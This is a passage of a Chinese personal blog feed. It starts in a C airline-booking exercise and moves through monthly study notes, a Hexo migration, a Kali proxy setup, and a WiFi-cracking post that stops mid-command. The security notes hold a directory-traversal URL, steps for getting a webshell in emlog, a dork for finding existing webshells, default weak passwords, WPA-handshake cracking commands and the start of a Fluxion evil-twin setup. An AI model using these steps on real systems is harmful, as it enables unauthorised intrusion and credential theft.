q;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">searchPlane</span><span class="params">(Node *L)</span> </span>&#123;    <span class="comment">/*搜寻航班*/</span></span><br><span class="line">    <span class="keyword">int</span> x, y;</span><br><span class="line">    Node *q;</span><br><span class="line">    q = L;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"请输入航班序号："</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;x);</span><br><span class="line">    <span class="keyword">while</span> (q != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (x == q -&gt; number) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"找到该航班！\n"</span>);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"航班序号：%d, 登机口:%d\n"</span>, q -&gt; number, q -&gt; input);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            q = q -&gt; next;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"未找到该航班\n"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">searchCustomer</span><span class="params">(Node *L, sqList *S)</span> </span>&#123;    <span class="comment">/*搜寻乘客*/</span></span><br><span class="line">    <span class="keyword">int</span> x, y, i;</span><br><span class="line">    <span class="keyword">char</span> s;</span><br><span class="line">    Node *q;</span><br><span class="line">    q = L;</span><br><span class="line">    q = q -&gt; next;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"请输入乘客所在飞机号："</span>);    <span class="comment">/*检测飞机是否存在*/</span></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;x);</span><br><span class="line">    <span class="keyword">while</span>(q != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (q -&gt; number == x) &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            q = q -&gt; next;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (q == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"未找到该飞机\n"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"请输入乘客身份识别号："</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;y);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt;= temp2; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (y == S -&gt; <span class="built_in">array</span>[i] -&gt; id) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"找到乘客，打印出数据：\n"</span>);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"乘客姓名：%s\n"</span>, S -&gt; <span class="built_in">array</span>[i] -&gt; name);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"乘客身份识别号：%d\n"</span>, S -&gt; <span class="built_in">array</span>[i] -&gt; id);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"乘客座位号：%d\n"</span>, S -&gt; <span class="built_in">array</span>[i] -&gt; seat);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"乘客目的地: %s\n"</span>, S -&gt; <span class="built_in">array</span>[i] -&gt; goal);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"舱位种类：%s\n"</span>, S -&gt; <span class="built_in">array</span>[i] -&gt; type);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"未找到该乘客\n"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">reserve</span><span class="params">(Node *L, sqList *S)</span> </span>&#123;</span><br><span class="line">     <span class="keyword">int</span> i;</span><br><span class="line">    L = L -&gt; next;</span><br><span class="line">    FILE *fp = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">if</span> ((fp = fopen(<span class="string">"Customer.txt"</span>, <span class="string">"w"</span>)) == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"不能打开文件！"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">fprintf</span>(fp, <span class="string">"%d\n"</span>, temp1);</span><br><span class="line">    <span class="built_in">fprintf</span>(fp, <span class="string">"%d\n"</span>, temp2);</span><br><span class="line">    <span class="keyword">while</span> (L != <span class="literal">NULL</span>) &#123;    <span class="comment">/*保存飞机节点*/</span></span><br><span class="line">        <span class="built_in">fprintf</span>(fp,<span class="string">"%d %d\n"</span>, L -&gt; number, L -&gt; input);</span><br><span class="line">        L = L -&gt; next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt;= temp2; i++) &#123;    <span class="comment">/*保存乘客节点*/</span></span><br><span class="line">        <span class="built_in">fprintf</span>(fp, <span class="string">"%s %d %d %s %s %s\n"</span>, S -&gt; <span class="built_in">array</span>[i] -&gt; name, S -&gt; <span class="built_in">array</span>[i] -&gt; id, S -&gt; <span class="built_in">array</span>[i] -&gt; seat,</span><br><span class="line">                 S -&gt; <span class="built_in">array</span>[i] -&gt; sex, S -&gt; <span class="built_in">array</span>[i] -&gt; goal, S -&gt; <span class="built_in">array</span>[i] -&gt; type);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">fprintf</span>(fp, <span class="string">"%d\n"</span>, S -&gt; length);</span><br><span class="line">    fclose(fp);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"成功完成"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">read</span><span class="params">(Node *L, sqList*S)</span> </span>&#123;</span><br><span class="line">    FILE *fp = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">    Node *q;</span><br><span class="line">    <span class="keyword">if</span> ((fp = fopen(<span class="string">"Customer.txt"</span>, <span class="string">"r"</span>)) == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"不能打开文件！"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">fscanf</span>(fp, <span class="string">"%d\n"</span>, &amp;temp1);</span><br><span class="line">    <span class="built_in">fscanf</span>(fp, <span class="string">"%d\n"</span>, &amp;temp2);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; temp1; i++) &#123;    <span class="comment">/*读取飞机数据*/</span></span><br><span class="line">        q = (Node*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Node));</span><br><span class="line">        <span class="built_in">fscanf</span>(fp, <span class="string">"%d %d\n"</span>, &amp;q -&gt; number, &amp;q -&gt; input);</span><br><span class="line">        L -&gt; next = q;</span><br><span class="line">        L = q;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt;= temp2; i++); &#123;</span><br><span class="line">        Customer *temp;</span><br><span class="line">        temp = (Customer*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Customer));</span><br><span class="line">        <span class="built_in">fscanf</span>(fp,<span class="string">"%s %d %d %s %s %s\n"</span>, &amp;temp -&gt; name, &amp;temp -&gt; id, &amp;temp -&gt; seat, &amp;temp -&gt; sex, &amp;temp -&gt; goal,</span><br><span class="line">            &amp;temp -&gt; type);</span><br><span class="line">        S -&gt; <span class="built_in">array</span>[i] = temp;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="built_in">fscanf</span>(fp ,<span class="string">"%d\n"</span>, &amp;S -&gt; length);</span><br><span class="line">    fclose(fp);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"成功完成"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Node *L;</span><br><span class="line">    sqList *S;</span><br><span class="line">    L = (Node*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Node));</span><br><span class="line">    S = (sqList*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(sqList));</span><br><span class="line">    initSqList(&amp;S);</span><br><span class="line">    <span class="keyword">int</span> ch;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"                       --------飞机票预订系统--------\n"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"                               1.创建航班\n"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"                               2.创建乘客\n"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"                               3.查询航班信息\n"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"                               4.查询乘客信息\n"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"                               5.保存信息\n"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"                               6.读取信息\n"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"                               7.删除飞机信息\n"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"                               0.退出系统\n"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"请输入您的选择:"</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;ch);</span><br><span class="line">        <span class="keyword">switch</span> (ch) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>:createPlane(&amp;L);<span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">2</span>:S = createSqList(&amp;L, &amp;S);<span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">3</span>:searchPlane(&amp;L);<span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">4</span>:searchCustomer(&amp;L, S);<span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">5</span>:reserve(&amp;L, S);<span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">6</span>:read(&amp;L, &amp;S);<span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">7</span>:deleteNode(&amp;L);<span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">0</span>:<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a href="https://github.com/moyui/datastructure" rel="external nofollow" target="_blank">源码参考</a></p>]]></content>
      
      
      <categories>
          
          <category> 总结 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 总结 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一九年四月总结</title>
      <link href="/b9f28ee5.html"/>
      <url>/b9f28ee5.html</url>
      
        <content type="html"><![CDATA[<hr><p><img src="https://raw.githubusercontent.com/N407PengYuYan/img/master/img/1904.jpg" alt=""></p><a id="more"></a><h1 id="一九年四月总结"><a href="#一九年四月总结" class="headerlink" title="一九年四月总结"></a>一九年四月总结</h1><h2 id="论坛："><a href="#论坛：" class="headerlink" title="论坛："></a>论坛：</h2><p>日本技术论坛:<a href="https://qiita.com/" rel="external nofollow" target="_blank">qiita</a>  </p><p>Medium:是一个博客发布平台，由 Twitter 联合创办人埃文·威廉姆斯和比兹·斯通于2012年8月创办。该平台有专业和非专业的贡献者，亦有受雇的编者，是社会新闻报导的例子之一。<a href="https://medium.com/websec" rel="external nofollow" target="_blank">websec文章</a></p><p>vulnspy:一个带有漏洞复现，漏洞博客的站点，<a href="https://www.vulnspy.com/" rel="external nofollow" target="_blank">点击访问</a></p><p>chabug团队论坛：<a href="https://www.chabug.org/" rel="external nofollow" target="_blank">点击访问</a></p><h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><p>外链转换网站:<a href="https://link.hhtjim.com/" rel="external nofollow" target="_blank">网站链接</a></p><p>iTunes实现PC到ipad文件传输：<a href="https://zhidao.baidu.com/question/422281453.html" rel="external nofollow" target="_blank">百度知道</a></p><p>音乐外链:<a href="http://mp34.butterfly.mopaasapp.com/" rel="external nofollow" target="_blank">热门歌曲下载</a></p><p>漏洞查询网站:<a href="https://www.exploit-db.com/" rel="external nofollow" target="_blank">exploit-db</a></p><p>过狗工具冰蝎:<a href="https://github.com/rebeyond/Behinder/releases" rel="external nofollow" target="_blank">下载地址</a></p><p>电报安卓旧版:<a href="https://telegram.cn.uptodown.com/android/old" rel="external nofollow" target="_blank">下载地址</a></p><h2 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h2><h3 id="讯时系统-xuas-后台漏洞"><a href="#讯时系统-xuas-后台漏洞" class="headerlink" title="讯时系统(xuas)后台漏洞"></a>讯时系统(xuas)后台漏洞</h3><p>回显后台：</p><blockquote><p>/admin/admin_news_pl_view.asp?id=1</p></blockquote><p>列目录漏洞：</p><blockquote><p><a href="http://www.xx.com/edit/admin_uploadfile.asp?id=46&amp;dir=../." rel="external nofollow" target="_blank">http://www.xx.com/edit/admin_uploadfile.asp?id=46&amp;dir=../.</a>.</p></blockquote><p>漏洞参考文章</p><p><a href="https://www.nuoweb.com/hack/398.html" rel="external nofollow" target="_blank">讯时系统(xuas)最新通杀漏洞0day图文说明</a></p><p><a href="https://www.jb51.net/hack/44598.html" rel="external nofollow" target="_blank">讯时后台管理系统v4.9的鸡肋漏洞分析</a></p><h3 id="emblog拿shell思路"><a href="#emblog拿shell思路" class="headerlink" title="emblog拿shell思路"></a>emblog拿shell思路</h3><p>1.后台爆破试试弱口令</p><p>2.上传模板拿shell，模板文件夹中放入木马，路径为content/templates/模板名/木马名</p><p>3.上传插件拿shell，插件文件夹中放入木马，路径为content/plugins/模板名/木马名</p><p>4.设置那里有个“允许上传的附件类型 ”，加入asp文件类型（emlog限制了添加php的后缀，没把asp的给限制）<code>未验证是否可行</code></p><p>漏洞参考文章</p><p><a href="http://www.hacksec.cn/Penetration-test/22.html" rel="external nofollow" target="_blank">emlog后台拿shell方法合集</a></p><p><a href="https://www.leavesongs.com/PENETRATION/emlog-writter-sql-inj.html" rel="external nofollow" target="_blank">emlog后台作者权限SQL注入</a></p><p><a href="https://www.jianshu.com/p/01864139dfc7" rel="external nofollow" target="_blank">针对emlog友情链接插件审计出的SQL注入漏洞</a></p><p><a href="https://www.cesafe.com/6518.html" rel="external nofollow" target="_blank">emlog全版本后台GetShell 视频教程</a></p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><h3 id="冰蝎"><a href="#冰蝎" class="headerlink" title="冰蝎"></a>冰蝎</h3><p>1.<a href="https://www.chabug.org/web/580.html" rel="external nofollow" target="_blank">冰蝎动态二进制加密过waf并修改自己菜刀过狗</a></p><p>2.<a href="https://github.com/rebeyond/Behinder" rel="external nofollow" target="_blank">冰蝎项目readme</a></p><h2 id="伪造电子邮件以及制造电子邮件炸弹的攻防探讨"><a href="#伪造电子邮件以及制造电子邮件炸弹的攻防探讨" class="headerlink" title="伪造电子邮件以及制造电子邮件炸弹的攻防探讨"></a>伪造电子邮件以及制造电子邮件炸弹的攻防探讨</h2><p><a href="https://www.freebuf.com/sectool/184555.html" rel="external nofollow" target="_blank">freebuf文章</a>,<a href="https://www.tr0y.wang/2018/09/26/email-hacker/" rel="external nofollow" target="_blank">作者的个人博客</a></p><h2 id="github学习项目"><a href="#github学习项目" class="headerlink" title="github学习项目"></a>github学习项目</h2><p>1.<a href="https://lib-pku.github.io/" rel="external nofollow" target="_blank">“北大图书馆”Github传送门</a></p><p>2.<a href="https://github.com/QSCTech" rel="external nofollow" target="_blank">浙大项目传送门</a><br>3.<a href="https://github.com/PKUanonym" rel="external nofollow" target="_blank">清华大学共享了计算机系课程资源</a><br>4.<a href="https://github.com/mbinary" rel="external nofollow" target="_blank">中科大共享了计算机学院的课程资源</a></p><p>5.<a href="https://github.com/CoolPhilChen" rel="external nofollow" target="_blank">上海交大共享了14门关于计算机和高数的课程资源</a></p><h2 id="给四月的一些碎碎念"><a href="#给四月的一些碎碎念" class="headerlink" title="给四月的一些碎碎念"></a>给四月的一些碎碎念</h2><p>四月，慢慢地自己进入了考研复习的状态，但是并没有全身心的投入，以至于瞎搞了这些四月的技术方面的骚操作。博客在四月后到考研结束，骚操作将不会更新。可能会更新一些算法吧，一来是为了复习数据结构，二来是提升一下编程能力。万一复习得不错选了一个有机试的学校呢？</p><p>希望自己不要辜负大学最后一段青春，愿自己如愿以偿。</p><p><code>放下所有无关的东西，好好学习天天向上。</code></p><p><img src="https://raw.githubusercontent.com/N407PengYuYan/img/master/img/12.png" alt="Give time,Let the past pass"></p>]]></content>
      
      
      <categories>
          
          <category> 总结 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 总结 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一九年三月总结</title>
      <link href="/1e727a89.html"/>
      <url>/1e727a89.html</url>
      
        <content type="html"><![CDATA[<hr><p><img src="https://raw.githubusercontent.com/N407PengYuYan/img/master/img/1903.jpg" alt=""></p><a id="more"></a><h1 id="一九年三月总结"><a href="#一九年三月总结" class="headerlink" title="一九年三月总结"></a>一九年三月总结</h1><h2 id="渗透学习"><a href="#渗透学习" class="headerlink" title="渗透学习"></a>渗透学习</h2><p>1.通过已有黑页后面找马，尝试使用弱口令登陆</p><blockquote><p>intext：请于用于非法用途，后果作者概不负责！</p></blockquote><p>2.学习文章，多见识已有思想。</p><p>secwiki:<a href="https://www.sec-wiki.com" rel="external nofollow" target="_blank">SecWiki官网</a></p><p>先知社区:<a href="https://xz.aliyun.com/" rel="external nofollow" target="_blank">链接</a></p><p>3.常用弱口令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">administrator:password</span><br><span class="line">admin:12345</span><br><span class="line">root:secret</span><br><span class="line">guest:guest</span><br><span class="line">root:toor</span><br></pre></td></tr></table></figure><h2 id="常看文章"><a href="#常看文章" class="headerlink" title="常看文章"></a>常看文章</h2><p>25端口渗透：<a href="https://www.sqlsec.com/2017/08/smtp.html" rel="external nofollow" target="_blank">国光</a>可伪造邮件进行钓鱼等</p><p>iis短文件名泄露:<a href="https://github.com/lijiejie/IIS_shortname_Scanner" rel="external nofollow" target="_blank">github的代码</a>感觉危害不大，没利用过</p><p>thinkphp 5.0漏洞:<a href="https://www.jianshu.com/p/46ceb2c338bc?appinstall=0&amp;from=groupmessage" rel="external nofollow" target="_blank">命令执行漏洞</a>好好利用可getshell</p><h2 id="推荐阅读博客"><a href="#推荐阅读博客" class="headerlink" title="推荐阅读博客"></a>推荐阅读博客</h2><p><a href="https://www.cnblogs.com/someone9/" rel="external nofollow" target="_blank">hof的博客</a></p><p><a href="https://lfforu.com" rel="external nofollow" target="_blank">Allesa学姐的博客</a></p><p><a href="https://www.cnblogs.com/yakoazz" rel="external nofollow" target="_blank">老潘的博客</a></p>]]></content>
      
      
      <categories>
          
          <category> 总结 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 总结 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hexo搬迁</title>
      <link href="/7db0a7db.html"/>
      <url>/7db0a7db.html</url>
      
        <content type="html"><![CDATA[<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p>之前的博客是在<code>kali</code>上搭建的,开学了旧电脑懒得带自能搬家博客了。</p><p>系统：<code>win10</code></p><p>博客安装环境：<code>nodejs、hexo</code> 之前参看本专业大神的博客试着搭建过，后来没成功，但是环境没卸载。当时的<a href="https://orangice.gitee.io/2017/03/18/hexo00/" rel="external nofollow" target="_blank">参考文章</a></p><h1 id="搬迁"><a href="#搬迁" class="headerlink" title="搬迁"></a>搬迁</h1><p>网上有通过github的方式进行搬迁，我嫌太麻烦了，就直接从kali上把博客的文件夹拷贝了。<br>1.<code>d盘</code>创建myBlog文件夹<br>2.将文件解压到文件夹下</p><h1 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h1><p>暂时就gulp不能正常使用<br>解决办法：<code>npm install -g gulp</code></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>先凑合着用，以后发现有什么需要改进的地方再解决</p><hr><p>更新： 2019/2/25</p><h1 id="写文章"><a href="#写文章" class="headerlink" title="写文章"></a>写文章</h1><h2 id="Typora"><a href="#Typora" class="headerlink" title="Typora"></a>Typora</h2><p>Typora是一个markdown编辑器，之前一直是用admin插件在写文章，听说这款软件不错，于是想试试。</p><p>下载地址:<a href="https://www.typora.io/" rel="external nofollow" target="_blank">官网</a></p><h2 id="PicGo"><a href="#PicGo" class="headerlink" title="PicGo"></a>PicGo</h2><p>PicGo是一个快捷的图片部署工具</p><h3 id="下载安装"><a href="#下载安装" class="headerlink" title="下载安装"></a>下载安装</h3><p><a href="https://github.com/Molunerfinn/PicGo" rel="external nofollow" target="_blank">项目地址</a><a href="https://picgo.github.io/PicGo-Doc/zh/" rel="external nofollow" target="_blank">帮助文档</a></p><h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h3><p>PicGo支持Github图床，我是参考这篇<a href="https://www.jianshu.com/p/87ea6603a824" rel="external nofollow" target="_blank">文章</a>来进行的配置</p><h4 id="登陆GitHub"><a href="#登陆GitHub" class="headerlink" title="登陆GitHub"></a>登陆GitHub</h4><h4 id="新建repo-命名为img"><a href="#新建repo-命名为img" class="headerlink" title="新建repo, 命名为img"></a>新建repo, 命名为img</h4><h4 id="设置好token"><a href="#设置好token" class="headerlink" title="设置好token"></a>设置好token</h4><ul><li>访问：<a href="https://github.com/settings/tokens" rel="external nofollow" target="_blank">https://github.com/settings/tokens</a></li><li><p>选择<code>generate new token</code></p></li><li><p>打勾<code>repo</code></p></li><li><p>选择<code>generate token</code></p></li></ul><p><strong>注意</strong>：这个token生成后只会显示一次！</p><h4 id="在PicGo页面根据提示进行填写"><a href="#在PicGo页面根据提示进行填写" class="headerlink" title="在PicGo页面根据提示进行填写"></a>在PicGo页面根据提示进行填写</h4><h3 id="imagine"><a href="#imagine" class="headerlink" title="imagine"></a>imagine</h3><p>图片压缩工具，下载：<a href="https://github.com/meowtec/Imagine/releases" rel="external nofollow" target="_blank">项目地址</a></p><h3 id="软件样式"><a href="#软件样式" class="headerlink" title="软件样式"></a>软件样式</h3><p><img src="https://raw.githubusercontent.com/N407PengYuYan/img/master/img/0.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> WEB学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo倒腾 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>kali 科学上网</title>
      <link href="/f46ff6ee.html"/>
      <url>/f46ff6ee.html</url>
      
        <content type="html"><![CDATA[<hr><h1 id="kali-科学上网"><a href="#kali-科学上网" class="headerlink" title="kali 科学上网"></a>kali 科学上网</h1><p>32位的kali貌似没有图形化操作界面的科学上网软件，于是只好使用命令行操作了。</p><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>终端输入：</p><blockquote><p>sudo apt install shadowsocks</p></blockquote><h3 id="编辑帐号密码"><a href="#编辑帐号密码" class="headerlink" title="编辑帐号密码"></a>编辑帐号密码</h3><p>终端输入：</p><blockquote><p>vi /etc/shadowsocks.json</p></blockquote><p>在配置文件中按照下面的格式填写配置信息，也就帐号密码之类的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123; </span><br><span class="line">  &quot;server&quot;:&quot;服务器地址&quot;, </span><br><span class="line">  &quot;server_port&quot;:服务器端口号, </span><br><span class="line">  &quot;local_address&quot;: &quot;127.0.0.1&quot;, </span><br><span class="line">  &quot;local_port&quot;:1080, </span><br><span class="line">  &quot;password&quot;:&quot;密码&quot;, </span><br><span class="line">  &quot;timeout&quot;:300, </span><br><span class="line">  &quot;method&quot;:&quot;加密方式&quot;, </span><br><span class="line">  &quot;fast_open&quot;: true, </span><br><span class="line">  &quot;workers&quot;: 1</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="设置proxychains"><a href="#设置proxychains" class="headerlink" title="设置proxychains"></a>设置proxychains</h3><h4 id="打开配置文件"><a href="#打开配置文件" class="headerlink" title="打开配置文件"></a>打开配置文件</h4><blockquote><p>vi /etc/proxychains.conf</p></blockquote><p>1.去掉dynamic_chain前面的注释符</p><p>2.在最下方，默认是sock4 xxxx xxx改为sock5 127.0.0.1 xxxx （xxxx是自己刚才设定的端口号，也就是上边配置ss时输入的local_port:xxxx）</p><p>根据上面的设置此处就应该该为sock5 127.0.0.1:1080</p><h4 id="测试代理是否正常"><a href="#测试代理是否正常" class="headerlink" title="测试代理是否正常"></a>测试代理是否正常</h4><blockquote><p>proxyresolv <a href="http://www.target.com" rel="external nofollow" target="_blank">www.target.com</a></p></blockquote><p>如果出现命令未找到，终端执行</p><blockquote><p>cp /usr/lib/proxychains3/proxyresolv /usr/bin/</p></blockquote><p>正常情况是没有开代理返回<strong><em>timeout</em></strong></p><h2 id="开启代理"><a href="#开启代理" class="headerlink" title="开启代理"></a>开启代理</h2><p>开启代理</p><blockquote><p>sslocal -c /etc/shadowsocks.json -d start</p></blockquote><p>转发启动软件</p><blockquote><p>火狐：proxychains firefox</p></blockquote><p>不用了就关闭代理</p><blockquote><p>sslocal -c /etc/shadowsocks.json -d stop</p></blockquote><ul><li>整个安装使用过程比较顺利，这可能和之前使用了ss的一些依赖环境有关</li><li>需要关闭火狐再使用转发启动软件</li></ul>]]></content>
      
      
      <categories>
          
          <category> linux学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 科学上网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WiFi小结</title>
      <link href="/98b05704.html"/>
      <url>/98b05704.html</url>
      
        <content type="html"><![CDATA[<h1 id="学习小结"><a href="#学习小结" class="headerlink" title="学习小结"></a><em>学习小结</em></h1><ul><li>免责声明:以下内容仅供学习参考</li></ul><h1 id="跑包"><a href="#跑包" class="headerlink" title="跑包"></a>跑包</h1><h2 id="GUP跑包"><a href="#GUP跑包" class="headerlink" title="GUP跑包"></a>GUP跑包</h2><h3 id="转换格式"><a href="#转换格式" class="headerlink" title="转换格式"></a>转换格式</h3><p>使用<code>hashcat</code>密码破解,首先使用工具将cap转换成hccapx<br>方法一：<a href="https://hashcat.net/cap2hccapx/" rel="external nofollow" target="_blank">在线转换网站</a><br>方法二：下载工具<br>工具下载：<a href="https://github.com/hashcat/hashcat-utils/tree/master" rel="external nofollow" target="_blank">下载</a><br>下载完成后进入src目录编译cap2hccapx.c</p><blockquote><p>gcc cap2hccapx.c -o cap2hccapx</p></blockquote><p>转换文件</p><blockquote><p>./cap2hccapx input.pcap output.hccapx</p></blockquote><h3 id="解密"><a href="#解密" class="headerlink" title="解密"></a>解密</h3><p>方法一：使用<code>naive-hashcat</code>解密，我的垃圾电脑跑不了，这个只是了解参考。<a href="https://github.com/brannondorsey/naive-hashcat" rel="external nofollow" target="_blank">项目地址</a></p><p>方法二:在线解密</p><p><a href="https://gpuhash.me" rel="external nofollow" target="_blank">这个需要支付BTC</a>:穷，玩不起，没使用</p><p><a href="https://www.onlinehashcrack.com/wifi-wpa-rsna-psk-crack.php" rel="external nofollow" target="_blank">这个可以免费跑2千万个密码</a>:结果会发送到填写的邮箱</p><h1 id="欺骗用户"><a href="#欺骗用户" class="headerlink" title="欺骗用户"></a>欺骗用户</h1><h2 id="设备"><a href="#设备" class="headerlink" title="设备"></a>设备</h2><p>一台PC–<code>kali</code>系统</p><p>一个usb无线网卡–<code>RT3070</code></p><p>两台手机–一台<code>开热点</code>一台模拟<code>合法用户</code></p><h2 id="软件"><a href="#软件" class="headerlink" title="软件"></a>软件</h2><p>下载最新版本</p><blockquote><p>git clone <a href="https://github.com/FluxionNetwork/fluxion.git" rel="external nofollow" target="_blank">https://github.com/FluxionNetwork/fluxion.git</a></p></blockquote><p>我使用的是3.10版本的，在<a href="https://github.com/FluxionNetwork/fluxion" rel="external nofollow" target="_blank">项目地址</a>自行下载</p><h2 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h2><blockquote><p>cd fluxion</p></blockquote><blockquote><p>sudo 